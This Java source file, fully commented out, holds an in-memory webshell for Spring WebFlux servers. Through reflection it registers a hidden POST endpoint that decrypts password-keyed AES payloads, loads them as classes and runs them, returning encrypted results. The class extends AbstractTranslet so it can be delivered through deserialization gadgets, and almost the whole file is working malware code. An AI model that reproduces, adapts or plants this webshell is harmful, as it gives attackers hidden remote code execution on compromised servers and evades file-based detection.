package core.memshell;//package core.memshell;
//
//import com.sun.org.apache.xalan.internal.xsltc.DOM;
//import com.sun.org.apache.xalan.internal.xsltc.TransletException;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//import org.springframework.http.HttpStatus;
//import org.springframework.http.ResponseEntity;
//import org.springframework.web.bind.annotation.PostMapping;
//import org.springframework.web.reactive.result.method.RequestMappingInfo;
//import org.springframework.web.server.ServerWebExchange;
//import reactor.core.publisher.Mono;
//
//import java.lang.reflect.Method;
//import java.net.URL;
//import java.net.URLClassLoader;
//import java.util.HashMap;
//import java.util.Map;
//
//
//public class SpringWebfluxHandlerMemShell extends AbstractTranslet {
//    public static Map<String, Object> store = new HashMap<String , Object>();
//    public static String pass = "pAS3", md5, xc = "3c6e0b8a9c15224a";
//
//    public static String doInject(Object obj, String path) {
//        String msg;
//        try {
//            md5 = md5(pass + xc);
//            Method registerHandlerMethod = obj.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
//            registerHandlerMethod.setAccessible(true);
//            Method executeCommand = SpringWebfluxHandlerMemShell.class.getDeclaredMethod("xx", ServerWebExchange.class);
//            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();
//            registerHandlerMethod.invoke(obj, new SpringWebfluxHandlerMemShell(), executeCommand, requestMappingInfo);
//            msg = "ok";
//        } catch (Exception e) {
//            e.printStackTrace();
//            msg = "error";
//        }
//        return msg;
//    }
//
//
//    private static Class defineClass(byte[] classbytes) throws Exception {
//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
//        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//        method.setAccessible(true);
//        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
//    }
//
//    public byte[] x(byte[] s, boolean m) {
//        try {
//            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
//            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
//            return c.doFinal(s);
//        } catch (Exception e) {
//            return null;
//        }
//    }
//
//    public static String md5(String s) {
//        String ret = null;
//        try {
//            java.security.MessageDigest m;
//            m = java.security.MessageDigest.getInstance("MD5");
//            m.update(s.getBytes(), 0, s.length());
//            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
//        } catch (Exception e) {
//        }
//        return ret;
//    }
//
//    public static String base64Encode(byte[] bs) throws Exception {
//        String value = null;
//
//        Class base64;
//        try {
//            base64 = Class.forName("java.util.Base64");
//            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
//            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
//        } catch (Exception var6) {
//            try {
//                base64 = Class.forName("sun.misc.BASE64Encoder");
//                Object Encoder = base64.newInstance();
//                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
//            } catch (Exception var5) {
//            }
//        }
//
//        return value;
//    }
//
//    public static byte[] base64Decode(String bs) throws Exception {
//        byte[] value = null;
//
//        Class base64;
//        try {
//            base64 = Class.forName("java.util.Base64");
//            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
//            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
//        } catch (Exception var6) {
//            try {
//                base64 = Class.forName("sun.misc.BASE64Decoder");
//                Object decoder = base64.newInstance();
//                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
//            } catch (Exception var5) {
//            }
//        }
//
//        return value;
//    }
//
//    @PostMapping("/xx")
//    public synchronized ResponseEntity xx(
//            ServerWebExchange pdata) {
//        try {
//            Object bufferStream = pdata.getFormData().flatMap(c -> {
//                StringBuilder result = new StringBuilder();
//                try {
//                    String id = c.getFirst(pass);
//                    byte[] data = x(base64Decode(id), false);
//                    if (store.get("payload") == null) {
//                        store.put("payload", defineClass(data));
//                    } else {
//                        store.put("parameters", data);
//                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
//                        Object f = ((Class) store.get("payload")).newInstance();
//                        f.equals(arrOut);
//                        f.equals(data);
//                        result.append(md5.substring(0, 16));
//                        f.toString();
//                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
//                        result.append(md5.substring(16));
//                    }
//                } catch (Exception ex) {
//                    result.append(ex.getMessage());
//                }
//                return Mono.just(result.toString());
//            });
//            return new ResponseEntity(bufferStream, HttpStatus.OK);
//        } catch (Exception ex) {
//            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);
//        }
//    }
//
//    @Override
//    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
//
//    }
//
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
//
//    }
//}